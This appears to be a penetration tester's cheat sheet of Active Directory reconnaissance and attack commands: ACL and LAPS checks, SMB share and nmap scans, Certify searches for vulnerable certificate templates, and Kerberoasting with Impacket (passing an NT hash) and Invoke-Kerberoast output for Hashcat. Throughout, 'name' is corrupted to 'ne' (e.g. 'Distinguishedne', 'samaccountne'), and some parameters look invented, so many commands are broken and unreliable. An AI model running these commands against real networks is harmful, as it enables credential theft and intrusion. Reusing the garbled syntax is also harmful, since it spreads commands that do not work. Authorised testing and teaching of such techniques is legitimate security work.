### **Pentest Note: Comprehensive AD Recon and Service Enumeration**

---

#### **Domain Controller Reconnaissance**

- **List All Domain Controllers:**
  - **Command:**
    ```plaintext
    nltest /dclist:n.ad.testinternal.com
    ```
  - **Use Case:** Identifies all Domain Controllers within the specified domain.

---

#### **User Privileges and ACL Auditing**

- **Check Tier 1 vs. Tier 0 Control:**
  - **Command:**
    ```powershell
    Get-ObjectAcl -Distinguishedne "DC=domain,DC=com" -ResolveGUIDs | Where-Object { $_.IdentityReference -match "Tier1User" }
    ```
  - **Use Case:** Ensures that users in Tier 1 do not have undue control over Tier 0 assets.

- **Evaluate ACLs for Specific Users:**
  - **Command:**
    ```powershell
    Get-ObjectAcl -Identity "<Assetne>" | Where-Object { $_.IdentityReference -eq "Userne" }
    ```
  - **Use Case:** Determines what access rights a user has over specific assets.

---

#### **Checking "Authenticated Users" Group Membership ACLs**

- **Check for WriteProperty Rights:**
  - **Command:**
    ```powershell
    Get-ACL -Path "AD:\<TargetPath>" | Format-List
    ```
  - **Use Case:** Checks if "Authenticated Users" have write properties, which may be RBCD exploitable.

---

#### **LAPS, GMSA, DFS, and GPO Auditing**

- **Check LAPS Password Readability:**
  - **Command:**
    ```powershell
    Get-DomainObjectAcl -TargetLapspwd | Where-Object { $_.IdentityReference -eq "Userne" }
    ```
  - **Use Case:** Ensures LAPS passwords are not exposed to unauthorized users.

- **Enumerate GMSA Accounts:**
  - **Command:**
    ```powershell
    Get-ADServiceAccount -Filter * | Select-Object ne,PrincipalsAllowedToRetrieveManagedPassword
    ```
  - **Use Case:** Audit GMSA accounts for potential misconfigurations.

- **Analyze GPO Groups and Memberships:**
  - **Command:**
    ```powershell
    Get-GPResultantSetOfPolicy -ReportType Html -Path C:\GPO_Report.html
    ```
  - **Use Case:** Trace GPOs and their memberships for potential abuse.

- **Find Vulnerable GPOs:**
  - **Command:**
    ```powershell
    Get-DomainGPO | Where-Object { $_.ne -like "*vulnerable*" }
    ```
  - **Use Case:** Identifies potentially vulnerable GPOs.

---

#### **SMB Shares**

- **Enumerate SMB Shares:**
  - **Command:**
    ```plaintext
    .\SharpShares.exe /threads:50 /ldap:exclude-dc /filter:SYSVOL,NETLOGON,IPC$,PRINT$ /verbose /outfile:C:\Users\Rob\Desktop\n_shares.txt /dc:10.8.5.1 /domain:nad.ABCDinternal.com
    ```
  - **Use Case:** Finds and lists SMB shares on the domain, excluding domain controllers and specific system shares.

---

#### **Kerberoasting**

- **Request SPN Hashes with Impacket:**
  - **Command:**
    ```plaintext
    impacket-GetUserSPNs -target-domain ad.testinternal.com -request -outputfile kerb_n.txt -hashes AAD3B435B51404EE:<redacted> -dc-ip 10.1.1.27 test-globalx.com/bho
    ```
  - **Use Case:** Extracts service principal nes (SPNs) with associated hashes for Kerberoasting attacks.

- **Find SPNs with PowerView:**
  - **Command:**
    ```powershell
    Get-NetUser -SPN -Domain ad.internal.com -Server 10.1.1.2 | select serviceprincipalne
    ```
  - **Use Case:** Enumerates users with SPNs in the domain.

- **Filter Users Likely to Be Kerberoastable:**
  - **Command:**
    ```powershell
    $kerberoastble = Get-DomainUser -SPN -Server ad.testinternal.com -Domain n.ad.test.com
    ```
  - **Use Case:** Identifies users with SPNs for potential Kerberoasting.

- **Check Password Last Set Date:**
  - **Command:**
    ```powershell
    $kerb | %{$_.samaccountne; write-host $_.pwdlastset}
    ```
  - **Use Case:** Identifies users with older passwords, which are more likely to be crackable.

- **Filter for Specific Users:**
  - **Command:**
    ```powershell
    $kerb | where {$_.samaccountne -eq "adminkelly"} | select -property memberof | fl
    ```
  - **Use Case:** Filters specific users to see their group memberships.

- **Request Hash Using PowerView:**
  - **Command:**
    ```powershell
    Invoke-Kerberoast -Domain n.ad.testinternal.com -Server 10.1.6.7 -OutputFormat Hashcat
    ```
  - **Use Case:** Automates the process of Kerberoasting and formats the output for Hashcat.

---

#### **Web Services**

- **Nmap for Web Services:**
  - **Command:**
    ```plaintext
    nmap 10.10.0.0/16 -p 80,443,8080,8443 --open -Pn -n -vvv -oA n-web-ports -T4 --max-rtt-timeout 500ms --max-retries 1 --min-hostgroup 256
    ```
  - **Use Case:** Scans a network range for open web service ports.

- **EyeWitness for Web Enumeration:**
  - **Command:**
    ```plaintext
    eyewitness -x ../n-web-ports.xml --timeout 8 --no-dns -d n/
    ```
  - **Use Case:** Captures screenshots and gathers information about discovered web services.

---

#### **Active Directory Certificate Services (AD CS)**

- **Find AD CS Instances:**
  - **Command:**
    ```plaintext
    .\Certify.exe find /domain:n.ad.testinternal.com /ldapserver:MA2.n.ad.testinternal.com
    ```
  - **Use Case:** Identifies certificate authorities within the domain.

- **Find Vulnerable AD CS Configurations:**
  - **Command:**
    ```plaintext
    .\Certify.exe find /vulnerable /domain:n.ad.testinternal.com /ldapserver:102.ad.testinternal.com
    ```
  - **Use Case:** Finds vulnerable configurations in AD Certificate Services.

---

#### **SSH GSSAPI**

- **Nmap for SSH GSSAPI Authentication:**
  - **Command:**
    ```plaintext
    nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=root" l60.n.testinternal.com
    ```
  - **Use Case:** Tests SSH servers for supported authentication methods, specifically GSSAPI.

- **Batch Scan SSH Hosts:**
  - **Commands:**
    ```plaintext
    nmap -p 22 --open -iL linux-hosts.txt -oA gssapi-test
    nmap -p 22 --open -T1 --randomize-hosts -iL linux-hosts3.txt -oA gssapi-test3
    nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=root" -Pn 10.4.2.4 
    nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=root" -Pn 10.4.8.2
    ```
  - **Use Case:** Scans multiple SSH hosts to identify those that support GSSAPI or other authentication methods.

---

#### **SQL Instance Enumeration**

- **Find SQL Instances in Domain:**
  - **Command:**
    ```powershell
    $instances = Get-SQLInstanceDomain -Verbose -DomainController 10.1.1.2
    ```
  - **Use Case:** Enumerates SQL instances within the domain for potential exploitation.
